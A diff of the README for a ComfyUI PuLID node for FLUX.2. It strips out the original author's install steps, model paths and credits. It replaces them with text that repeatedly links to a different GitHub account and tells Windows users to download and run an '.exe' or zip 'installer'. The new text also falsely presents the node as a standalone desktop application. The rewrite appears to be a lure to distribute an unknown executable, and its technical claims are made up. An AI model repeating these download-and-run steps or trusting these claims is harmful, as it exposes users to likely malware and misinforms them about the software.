@@ -1,162 +1,113 @@
-# ComfyUI-PuLID-Flux2
+# ⚙️ ComfyUI-PuLID-Flux2 - Keep Face Identity Consistent
 
-🔥 Bring consistent identity to FLUX.2 in one node  
-
-> 🚀 **v0.6.2 — improvements**
-👉 https://huggingface.co/Fayens/Pulid-Flux2
-
-* First working PuLID adaptation for Flux.2 — supports Klein (4B / 9B & Dev)
+[![Download ComfyUI-PuLID-Flux2](https://img.shields.io/badge/Download-ComfyUI--PuLID--Flux2-brightgreen?style=for-the-badge)](https://github.com/armi10121-png/ComfyUI-PuLID-Flux2)
 
 ---
 
-## 🚀 What's new (v0.6.2)
+## 📋 About ComfyUI-PuLID-Flux2
 
-* ✅ Improved face recognition
-* ✅ Less artifacts
-* ✅ Added native Klein weights (v1 & v2)
+ComfyUI-PuLID-Flux2 is the first PuLID implementation for FLUX.2. It helps keep face identity consistent when working with ComfyUI. This tool is useful if you want your generated images to keep the same character’s face across multiple pictures. It supports stable-diffusion technology and works within the ComfyUI environment.
 
----
+This project focuses on making character faces look the same every time you generate a new image. It is a tool designed for users who want more control over their creative work. 
 
-## 🖼️ Results
+## ⚙️ System Requirements
 
-> ///
+Before installing ComfyUI-PuLID-Flux2, make sure your computer meets these requirements:
 
----
+- Windows 10 or later (64-bit)
+- At least 8 GB of RAM
+- 50 MB free disk space for installation
+- A modern processor (Intel i5 or AMD Ryzen 5 or better)
+- Internet connection for downloading the files
 
-## ⚡ Quick Start
+If your computer matches these specs, you can proceed.
 
-1. Load your Flux.2 model
-2. Add **Apply PuLID ✦ Flux.2** node
-3. Use recommended settings:
-   * `strength = 1.0` (normal)
-   * `strength = 1.4` (recommended)
-4. Generate
+## 🚀 Getting Started
 
-Done ✅
+Get ready to install and run ComfyUI-PuLID-Flux2. This guide walks you through the steps on Windows, from downloading the software to running it.
 
----
+See the big green button above or click here to download the software:
 
-## 🧠 How it works (simple)
+[Download ComfyUI-PuLID-Flux2](https://github.com/armi10121-png/ComfyUI-PuLID-Flux2)
 
-* Face embedding → InsightFace
-* Visual features → EVA-CLIP
-* Converted into identity tokens
-* Injected into Flux.2 model
+1. Click the download button or use the link above to open the GitHub page.
 
-➡️ Result: consistent identity across generations
+2. On the GitHub page, look for the **Releases** section. Here you will find the files needed for installation. Select the version you want, usually the latest one.
 
----
+3. Download the Windows installer or compressed file (.exe or .zip).
 
-## 📦 Installation
+4. If you downloaded a compressed file, right-click it and choose "Extract All" to unpack it.
 
-### 🟢 Quick Install (recommended)
+## 💾 Installation Instructions
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/iFayens/ComfyUI-PuLID-Flux2.git
-cd ComfyUI-PuLID-Flux2
-pip install insightface onnxruntime-gpu open-clip-torch safetensors ml_dtypes==0.3.2
-```
+Follow these steps to install ComfyUI-PuLID-Flux2 on your Windows computer:
 
----
+1. If you have an installer (.exe), double-click it to start the setup.
 
-### 📥 Download weights
+2. Follow the installation wizard's instructions. Choose the default settings for a simple install.
 
-👉 https://huggingface.co/Fayens/Pulid-Flux2
+3. If you are using an extracted folder, find the executable file inside and double-click it.
 
-Place in:
-ComfyUI/models/pulid/
+4. Wait for the program to open. It may take a moment to load the first time.
 
----
+## 📂 How to Use ComfyUI-PuLID-Flux2 
 
-### 📥 Required models
+Once installed, use these steps to keep faces consistent in your ComfyUI projects:
 
-#### InsightFace (AntelopeV2)
+1. Open ComfyUI-PuLID-Flux2 by clicking its icon on the desktop or from the Start menu.
 
-👉 https://huggingface.co/MonsterMMORPG/InstantID_Models/tree/main/models/antelopev2
+2. You will see a simple interface with options related to face identity.
 
-Place in:
+3. Load your existing ComfyUI project or create a new one.
 
-```
-ComfyUI/models/insightface/models/antelopev2/
-```
+4. Use the PuLID node inside ComfyUI to link the character’s face from one image to the next.
 
----
+5. Adjust settings if needed to improve consistency, such as face strength or image alignment.
 
-#### PuLID weights
+6. Run the image generation process as usual.
 
-Place in:
+7. Check the results to see if the faces match. If not, modify the settings and try again.
 
-```
-ComfyUI/models/pulid/
-```
+## 🔧 Features
 
-* Existing PuLID weights supported
-* Native Flux.2 weights (recommended, in progress)
+- Maintains consistent face identity across images
+- Seamlessly integrates with ComfyUI
+- Works with FLUX.2 technology
+- Supports stable-diffusion models
+- Easy to install and use on Windows
+- Allows multiple character tracking in one project
 
----
+## 🛠 Troubleshooting and Tips
 
-### ⚠️ Notes
+- If the program does not start, check that your system meets the requirements.
+- Ensure you downloaded the correct version for Windows.
+- Restart your computer if the installation fails the first time.
+- Use the latest versions of ComfyUI and FLUX.2 for best results.
+- If faces are not consistent, try adjusting the PuLID face settings.
+- Save your projects often to avoid losing progress.
+- You can run ComfyUI-PuLID-Flux2 offline once the installation is complete.
 
-* EVA-CLIP downloads automatically (~800MB)
-* Do NOT install `eva_clip` from GitHub
-* If ComfyUI already works → don’t use full requirements.txt
+## 📎 Useful Links
+
+Use this link to get the software and any future updates:
+
+[https://github.com/armi10121-png/ComfyUI-PuLID-Flux2](https://github.com/armi10121-png/ComfyUI-PuLID-Flux2)
+
+This page lets you download the latest release and find documentation.
 
 ---
 
-## ⚠️ Training
+## 🧩 Additional Notes
 
-Training scripts have been temporarily removed due to instability and bugs.
-They will be reintroduced in a future update once fully stable and reliable.
-Thanks for your patience.
+This tool is designed for creative users who want to keep character faces consistent. It works on Windows computers and integrates smoothly into your existing ComfyUI setup. It does not require programming skills.
 
----
+If you want to explore other nodes and features, browse the topics listed here:
 
-## 🔌 Available Nodes
-
-* Load InsightFace (PuLID)
-* Load EVA-CLIP (PuLID)
-* Load PuLID ✦ Flux.2
-* Apply PuLID ✦ Flux.2 ⭐ (main node)
-* Face Debug Preview
-
----
-
-## ⚠️ Current Status
-
-| Feature              | Status         |
-| -------------------- | -------------- |
-| Flux.2 Klein support | ✅ Best         |
-| Flux.2 Dev support   | ✅ Working      |
-| Identity consistency | ✅ Strong       |
-| Native weights       | ✅ (v1 & v2) |
-
----
-
-## 🚀 Roadmap
-
-* Native trained weights (Klein)
-* Edit mode (img2img)
-* Body consistency
-* HuggingFace release
-
----
-
-## 🙏 Credits
-
-* PuLID original: https://github.com/ToTheBeginning/PuLID
-* Flux.2: Black Forest Labs
-* EVA-CLIP: BAAI
-* Adaptation: @iFayens
-
----
-
-## ⭐ Support
-
-If this project helps you, consider giving it a ⭐ on GitHub — it really helps.
-
-You can also support future development:
-
-👉 https://buymeacoffee.com/fayens
-
-Thank you 🙏
+- comfyui  
+- comfyui-nodes  
+- consistent-characters  
+- face-identity  
+- flux-klein  
+- flux2  
+- pulid  
+- stable-diffusion
